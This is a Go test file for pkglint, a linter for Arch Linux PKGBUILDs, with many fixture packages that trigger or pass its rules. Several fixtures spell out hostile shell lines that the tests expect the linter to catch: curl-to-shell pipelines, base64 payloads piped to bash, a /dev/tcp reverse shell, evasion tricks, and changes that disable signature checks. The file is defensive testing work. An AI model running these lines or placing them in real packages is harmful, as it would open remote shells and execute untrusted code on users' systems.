package rules

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/jmelahman/pkglint/internal/pkgbuild"
)

// lint writes the given files into a temp package dir and runs every rule.
func lint(t *testing.T, files map[string]string) []Finding {
	t.Helper()
	dir := t.TempDir()
	for name, content := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	pkg, err := pkgbuild.Load(dir)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	return Run(pkg, nil)
}

func ruleIDs(fs []Finding) map[string]int {
	out := map[string]int{}
	for _, f := range fs {
		out[f.RuleID]++
	}
	return out
}

const cleanPKGBUILD = `pkgname=demo
pkgver=1.0.0
pkgrel=1
pkgdesc='A demo'
arch=('x86_64')
url='https://github.com/example/demo'
license=('MIT')
source=("$pkgname-$pkgver.tar.gz::https://github.com/example/demo/archive/v$pkgver.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')

build() {
  cd "$pkgname-$pkgver"
  make
}

package() {
  cd "$pkgname-$pkgver"
  install -Dm755 demo "$pkgdir/usr/bin/demo"
}
`

func TestCleanPKGBUILDHasNoFindings(t *testing.T) {
	findings := lint(t, map[string]string{"PKGBUILD": cleanPKGBUILD})
	if len(findings) != 0 {
		t.Fatalf("expected no findings, got %+v", findings)
	}
}

func TestRegistryIsWellFormed(t *testing.T) {
	seen := map[string]bool{}
	for _, r := range Registry() {
		if seen[r.ID] {
			t.Errorf("duplicate rule ID %s", r.ID)
		}
		seen[r.ID] = true
		if r.Name == "" || r.Doc == "" || r.Check == nil {
			t.Errorf("rule %s is missing name, doc, or check", r.ID)
		}
		if r.Bad == "" || r.Good == "" {
			t.Errorf("rule %s is missing a Bad/Good example", r.ID)
		}
	}
}

// expectRule asserts that linting files yields at least one finding for id.
func expectRule(t *testing.T, id string, files map[string]string) {
	t.Helper()
	ids := ruleIDs(lint(t, files))
	if ids[id] == 0 {
		t.Errorf("expected %s, got %v", id, ids)
	}
}

// expectNoRule asserts that linting files yields no finding for id.
func expectNoRule(t *testing.T, id string, files map[string]string) {
	t.Helper()
	ids := ruleIDs(lint(t, files))
	if ids[id] != 0 {
		t.Errorf("expected no %s, got %v", id, ids)
	}
}

func pkgbuildWith(header, body string) string {
	if header == "" {
		header = `pkgname=demo
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url='https://example.com/demo'
license=('MIT')
source=("https://example.com/demo-$pkgver.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`
	}
	return header + "\n" + body + "\n"
}

func TestIntegrityRules(t *testing.T) {
	t.Run("PB101 skipped checksum on remote tarball", func(t *testing.T) {
		expectRule(t, "PB101", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo.tar.gz")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB101 not for VCS sources", func(t *testing.T) {
		expectNoRule(t, "PB101", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git#commit=abc123")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB102 md5-only digests", func(t *testing.T) {
		expectRule(t, "PB102", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo.tar.gz")
md5sums=('0123456789abcdef0123456789abcdef')`, "")})
	})
	t.Run("PB102 not when sha256 also present", func(t *testing.T) {
		expectNoRule(t, "PB102", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo.tar.gz")
md5sums=('0123456789abcdef0123456789abcdef')
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB103 mutable tag pin", func(t *testing.T) {
		expectRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git#tag=v1")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB103 commit pin is fine", func(t *testing.T) {
		expectNoRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git#commit=0123abc")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB104 plain http source", func(t *testing.T) {
		expectRule(t, "PB104", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("http://example.com/demo.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB105 source host differs from url host", func(t *testing.T) {
		expectRule(t, "PB105", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://project.example.com'
source=("https://cdn.sketchy.io/demo.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB105 github raw content allowed", func(t *testing.T) {
		expectNoRule(t, "PB105", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://github.com/example/demo'
source=("https://raw.githubusercontent.com/example/demo/main/x.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB106 DLAGENTS override", func(t *testing.T) {
		expectRule(t, "PB106", map[string]string{"PKGBUILD": pkgbuildWith("",
			`DLAGENTS=('https::/usr/bin/curl -o %o %u')`)})
	})
	t.Run("PB107 missing install script", func(t *testing.T) {
		expectRule(t, "PB107", map[string]string{"PKGBUILD": pkgbuildWith("", `install=demo.install`)})
	})
	t.Run("PB108 command-executing makepkg.conf override", func(t *testing.T) {
		expectRule(t, "PB108", map[string]string{"PKGBUILD": pkgbuildWith("",
			`VCSCLIENTS=('git::/tmp/evil-git')`)})
	})
	t.Run("PB108 trust-affecting override", func(t *testing.T) {
		expectRule(t, "PB108", map[string]string{"PKGBUILD": pkgbuildWith("",
			`PACKAGER='Trusted Maintainer <root@example.com>'`)})
	})
	t.Run("PB108 leaves ordinary build vars alone", func(t *testing.T) {
		expectNoRule(t, "PB108", map[string]string{"PKGBUILD": pkgbuildWith("",
			`MAKEFLAGS="-j$(nproc)"`)})
	})
	t.Run("PB109 same forge, different owner", func(t *testing.T) {
		expectRule(t, "PB109", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://github.com/upstream/demo'
source=("git+https://github.com/somebodyelse/demo.git#commit=0123abc")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB109 same forge and owner is fine", func(t *testing.T) {
		expectNoRule(t, "PB109", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://github.com/upstream/demo'
source=("git+https://github.com/upstream/demo.git#commit=0123abc")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB110 checksum count mismatch", func(t *testing.T) {
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/a.tar.gz" "https://example.com/b.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 matched counts are fine", func(t *testing.T) {
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith("", "")})
	})
}

func TestHermeticRules(t *testing.T) {
	t.Run("PB201 curl in build", func(t *testing.T) {
		expectRule(t, "PB201", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  curl -O https://example.com/extra.tar.gz
}`)})
	})
	t.Run("PB201 curl in prepare is fine", func(t *testing.T) {
		expectNoRule(t, "PB201", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  curl -O https://example.com/extra.tar.gz
}`)})
	})
	t.Run("PB202 pip without hashes", func(t *testing.T) {
		expectRule(t, "PB202", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  pip install -r requirements.txt
}`)})
	})
	t.Run("PB202 pip with hashes ok", func(t *testing.T) {
		expectNoRule(t, "PB202", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  pip install --require-hashes -r requirements.txt
}`)})
	})
	t.Run("PB203 cargo build unlocked", func(t *testing.T) {
		expectRule(t, "PB203", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  cargo build --release
}`)})
	})
	t.Run("PB203 cargo --locked ok", func(t *testing.T) {
		expectNoRule(t, "PB203", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  cargo build --release --locked
}`)})
	})
	t.Run("PB204 bare go build", func(t *testing.T) {
		expectRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  go build -o demo .
}`)})
	})
	t.Run("PB204 vendored go build ok", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  go build -mod=vendor -o demo .
}`)})
	})
	t.Run("PB204 go mod download in prepare ok", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  go mod download
}
build() {
  go build -o demo .
}`)})
	})
	t.Run("PB205 GOFLAGS -insecure", func(t *testing.T) {
		expectRule(t, "PB205", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  GOFLAGS=-insecure go build -o demo .
}`)})
	})
	t.Run("PB206 npm install", func(t *testing.T) {
		expectRule(t, "PB206", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  npm install
}`)})
	})
}

func TestExecRules(t *testing.T) {
	t.Run("PB301 top-level command", func(t *testing.T) {
		expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", `curl https://example.com/beacon`)})
	})
	t.Run("PB301 top-level assignments fine", func(t *testing.T) {
		expectNoRule(t, "PB301", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
	t.Run("PB302 eval", func(t *testing.T) {
		expectRule(t, "PB302", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  eval "$stuff"
}`)})
	})
	t.Run("PB303 base64 decode into shell", func(t *testing.T) {
		expectRule(t, "PB303", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  echo "$payload" | base64 -d | bash
}`)})
	})
	t.Run("PB304 curl into shell", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  curl -fsSL https://example.com/setup.sh | sh
}`)})
	})
	t.Run("PB304 source of process substitution", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  source <(curl -s https://example.com/env.sh)
}`)})
	})
	t.Run("PB304 sh -c command substitution", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  sh -c "$(wget -qO- https://example.com/run.sh)"
}`)})
	})
	t.Run("PB305 dev tcp", func(t *testing.T) {
		expectRule(t, "PB305", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  bash -i >/dev/tcp/198.51.100.1/4444 0<&1
}`)})
	})
	t.Run("PB306 indirect command", func(t *testing.T) {
		expectRule(t, "PB306", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  x=curl
  "${!x}" https://example.com
}`)})
	})
	t.Run("PB307 hex escape payload", func(t *testing.T) {
		expectRule(t, "PB307", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  p=$'\x62\x61\x73\x68\x20\x2d\x63\x20\x65\x76\x69\x6c'
}`)})
	})
	t.Run("PB308 overrides a makepkg internal", func(t *testing.T) {
		expectRule(t, "PB308", map[string]string{"PKGBUILD": pkgbuildWith("", `
verify_integrity_one() {
  return 0
}`)})
	})
	t.Run("PB308 ordinary package functions are fine", func(t *testing.T) {
		expectNoRule(t, "PB308", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
	t.Run("PB309 bidi override control", func(t *testing.T) {
		expectRule(t, "PB309", map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  make ‮install\n}")})
	})
	t.Run("PB309 zero-width character", func(t *testing.T) {
		expectRule(t, "PB309", map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  ma​ke\n}")})
	})
	t.Run("PB309 plain ASCII is clean", func(t *testing.T) {
		expectNoRule(t, "PB309", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
}

// Adversarial variants that trivially evade regex scanners but not an AST.
func TestAdversarialEvasion(t *testing.T) {
	t.Run("line continuations inside the pipeline", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  curl \
    -fsSL \
    https://example.com/x.sh \
    | \
    bash
}`)})
	})
	t.Run("quote-splitting the command name", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  'cu'"rl" https://example.com/x.sh | 'ba'sh
}`)})
	})
	t.Run("wrapper commands around the downloader", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  env -i curl https://example.com/x.sh | env bash
}`)})
	})
	t.Run("full path to interpreter", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  wget -qO- https://example.com/x.sh | /usr/bin/bash
}`)})
	})
	t.Run("eval of downloaded content", func(t *testing.T) {
		files := map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  eval "$(curl -s https://example.com/x.sh)"
}`)}
		expectRule(t, "PB302", files)
		findings := lint(t, files)
		for _, f := range findings {
			if f.RuleID == "PB302" && f.Severity != Critical {
				t.Errorf("eval of download should be critical, got %s", f.Severity)
			}
		}
	})
}

func TestFSRules(t *testing.T) {
	t.Run("PB401 write to home", func(t *testing.T) {
		expectRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  echo 'alias x=y' >> "$HOME/.bashrc"
}`)})
	})
	t.Run("PB401 cp to /etc", func(t *testing.T) {
		expectRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  cp demo.conf /etc/demo.conf
}`)})
	})
	t.Run("PB401 install into pkgdir fine", func(t *testing.T) {
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
	t.Run("PB402 sudo", func(t *testing.T) {
		expectRule(t, "PB402", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  sudo make install
}`)})
	})
	t.Run("PB403 setuid chmod", func(t *testing.T) {
		expectRule(t, "PB403", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  chmod u+s "$pkgdir/usr/bin/demo"
}`)})
	})
	t.Run("PB403 setuid install mode", func(t *testing.T) {
		expectRule(t, "PB403", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  install -Dm4755 demo "$pkgdir/usr/bin/demo"
}`)})
	})
	t.Run("PB403 ordinary install mode fine", func(t *testing.T) {
		expectNoRule(t, "PB403", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
	t.Run("PB404 make install without destdir", func(t *testing.T) {
		expectRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  make install
}`)})
	})
	t.Run("PB404 DESTDIR arg is fine", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  make DESTDIR="$pkgdir" install
}`)})
	})
	t.Run("PB404 exported DESTDIR is fine", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  export DESTDIR="$pkgdir"
  ninja -C build install
}`)})
	})
	t.Run("PB404 cmake --install with prefix is fine", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  cmake --install build --prefix "$pkgdir/usr"
}`)})
	})
	t.Run("PB404 install outside package() ignored", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  make install
}`)})
	})
	t.Run("PB405 write to pacman.conf", func(t *testing.T) {
		files := map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  echo 'SigLevel = Never' >> /etc/pacman.conf
}`)}
		expectRule(t, "PB405", files)
		expectNoRule(t, "PB401", files) // PB405 owns sensitive paths; no double report
	})
	t.Run("PB405 pacman-key", func(t *testing.T) {
		expectRule(t, "PB405", map[string]string{
			"PKGBUILD": pkgbuildWith("", "install=demo.install"),
			"demo.install": `post_install() {
  pacman-key --recv-keys DEADBEEF
}`,
		})
	})
	t.Run("PB405 staged pacman.conf under pkgdir is fine", func(t *testing.T) {
		expectNoRule(t, "PB405", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  install -Dm644 pacman.conf "$pkgdir/etc/pacman.conf"
}`)})
	})
}

func TestScriptletRules(t *testing.T) {
	base := pkgbuildWith("", "install=demo.install")
	t.Run("PB501 curl in post_install", func(t *testing.T) {
		expectRule(t, "PB501", map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  curl -s https://example.com/track
}`,
		})
	})
	t.Run("PB502 crontab", func(t *testing.T) {
		expectRule(t, "PB502", map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  crontab /tmp/x
}`,
		})
	})
	t.Run("PB502 login shell user", func(t *testing.T) {
		expectRule(t, "PB502", map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  useradd -r -s /bin/bash demo
}`,
		})
	})
	t.Run("clean scriptlet fine", func(t *testing.T) {
		ids := ruleIDs(lint(t, map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  update-desktop-database -q
}`,
		}))
		for _, id := range []string{"PB501", "PB502"} {
			if ids[id] != 0 {
				t.Errorf("unexpected %s: %v", id, ids)
			}
		}
	})
}

func TestConsistencyRules(t *testing.T) {
	t.Run("PB601 pkgver mismatch", func(t *testing.T) {
		expectRule(t, "PB601", map[string]string{
			"PKGBUILD": cleanPKGBUILD,
			".SRCINFO": `pkgbase = demo
	pkgver = 9.9.9
	pkgrel = 1
	url = https://github.com/example/demo
	source = demo-1.0.0.tar.gz::https://github.com/example/demo/archive/v1.0.0.tar.gz

pkgname = demo
`,
		})
	})
	t.Run("PB601 matching srcinfo fine", func(t *testing.T) {
		expectNoRule(t, "PB601", map[string]string{
			"PKGBUILD": cleanPKGBUILD,
			".SRCINFO": `pkgbase = demo
	pkgver = 1.0.0
	pkgrel = 1
	url = https://github.com/example/demo
	source = demo-1.0.0.tar.gz::https://github.com/example/demo/archive/v1.0.0.tar.gz

pkgname = demo
`,
		})
	})
	t.Run("PB602 curl in pkgver", func(t *testing.T) {
		expectRule(t, "PB602", map[string]string{"PKGBUILD": pkgbuildWith("", `
pkgver() {
  curl -s https://example.com/latest
}`)})
	})
}

func TestCorrectnessRules(t *testing.T) {
	// A minimal valid metadata header these tests vary one field at a time.
	valid := `pkgname=demo
pkgver=1.0.0
pkgrel=1
arch=('x86_64')`

	t.Run("PB701 invalid pkgname characters", func(t *testing.T) {
		expectRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=Foo:Bar\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB701 leading hyphen", func(t *testing.T) {
		expectRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=-demo\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB701 valid name is fine", func(t *testing.T) {
		expectNoRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=foo-bar_2.0+git\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB701 array pkgname (split package) validated per element", func(t *testing.T) {
		expectRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=('good' 'Bad:Name')\npkgver=1\npkgrel=1\narch=('any')\n"})
	})

	t.Run("PB702 pkgver with hyphen", func(t *testing.T) {
		expectRule(t, "PB702", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1.2.3-beta\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB702 pkgver with colon", func(t *testing.T) {
		expectRule(t, "PB702", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1:2.3\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB702 valid pkgver is fine", func(t *testing.T) {
		expectNoRule(t, "PB702", map[string]string{"PKGBUILD": valid + "\n"})
	})
	t.Run("PB702 skipped when pkgver() computes it", func(t *testing.T) {
		expectNoRule(t, "PB702", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1.2.3-beta\npkgrel=1\narch=('any')\npkgver() {\n  echo 1\n}\n"})
	})

	t.Run("PB703 non-numeric pkgrel", func(t *testing.T) {
		expectRule(t, "PB703", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1a\narch=('any')\n"})
	})
	t.Run("PB703 decimal pkgrel is fine", func(t *testing.T) {
		expectNoRule(t, "PB703", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1.5\narch=('any')\n"})
	})

	t.Run("PB704 non-integer epoch", func(t *testing.T) {
		expectRule(t, "PB704", map[string]string{"PKGBUILD": valid + "\nepoch=1.0\n"})
	})
	t.Run("PB704 integer epoch is fine", func(t *testing.T) {
		expectNoRule(t, "PB704", map[string]string{"PKGBUILD": valid + "\nepoch=2\n"})
	})

	t.Run("PB705 backup leading slash", func(t *testing.T) {
		expectRule(t, "PB705", map[string]string{"PKGBUILD": valid + "\nbackup=('/etc/foo.conf')\n"})
	})
	t.Run("PB705 relative backup is fine", func(t *testing.T) {
		expectNoRule(t, "PB705", map[string]string{"PKGBUILD": valid + "\nbackup=('etc/foo.conf')\n"})
	})

	t.Run("PB706 unknown option", func(t *testing.T) {
		expectRule(t, "PB706", map[string]string{"PKGBUILD": valid + "\noptions=('!striped')\n"})
	})
	t.Run("PB706 known options are fine", func(t *testing.T) {
		expectNoRule(t, "PB706", map[string]string{"PKGBUILD": valid + "\noptions=('!strip' 'lto' '!debug')\n"})
	})

	t.Run("PB707 provides comparison operator", func(t *testing.T) {
		expectRule(t, "PB707", map[string]string{"PKGBUILD": valid + "\nprovides=('libfoo<2')\n"})
	})
	t.Run("PB707 exact version provide is fine", func(t *testing.T) {
		expectNoRule(t, "PB707", map[string]string{"PKGBUILD": valid + "\nprovides=('libfoo=1.9')\n"})
	})

	t.Run("PB708 scalar list field", func(t *testing.T) {
		expectRule(t, "PB708", map[string]string{"PKGBUILD": valid + "\ndepends=gtk3\n"})
	})
	t.Run("PB708 array scalar field", func(t *testing.T) {
		expectRule(t, "PB708", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('any')\npkgdesc=('a demo')\n"})
	})
	t.Run("PB708 correct types are fine", func(t *testing.T) {
		expectNoRule(t, "PB708", map[string]string{"PKGBUILD": valid + "\ndepends=('gtk3')\n"})
	})
	t.Run("PB708 scalar pkgname is allowed (not a schema array)", func(t *testing.T) {
		expectNoRule(t, "PB708", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('any')\n"})
	})

	t.Run("PB709 non-override var in package function", func(t *testing.T) {
		expectRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  makedepends=('go')\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 override var in package function is fine", func(t *testing.T) {
		expectNoRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  depends=('glibc')\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 local var in package function is fine", func(t *testing.T) {
		expectNoRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  somevar=1\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 local-declared schema var is not a global override", func(t *testing.T) {
		// makepkg's regex only matches bare assignments, not `local`/`declare`.
		expectNoRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  local makedepends=('go')\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 nested schema var is still flagged", func(t *testing.T) {
		expectRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  if true; then\n    source=('x')\n  fi\n}\n"})
	})

	t.Run("PB710 missing arch", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\n"})
	})
	t.Run("PB710 any combined with concrete arch", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('any' 'x86_64')\n"})
	})
	t.Run("PB710 duplicate arch", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('x86_64' 'x86_64')\n"})
	})
	t.Run("PB710 invalid arch characters", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('x86-64')\n"})
	})
	t.Run("PB710 valid arch is fine", func(t *testing.T) {
		expectNoRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('x86_64' 'aarch64')\n"})
	})
}

func TestSuppression(t *testing.T) {
	files := map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  # pkglint: ignore=PB204
  go build -o demo .
}`)}
	expectNoRule(t, "PB204", files)
}

func TestIgnoreFlag(t *testing.T) {
	dir := t.TempDir()
	content := pkgbuildWith("", `
build() {
  go build -o demo .
}`)
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	pkg, err := pkgbuild.Load(dir)
	if err != nil {
		t.Fatal(err)
	}
	if ids := ruleIDs(Run(pkg, map[string]bool{"PB204": true})); ids["PB204"] != 0 {
		t.Errorf("ignored rule still reported: %v", ids)
	}
}
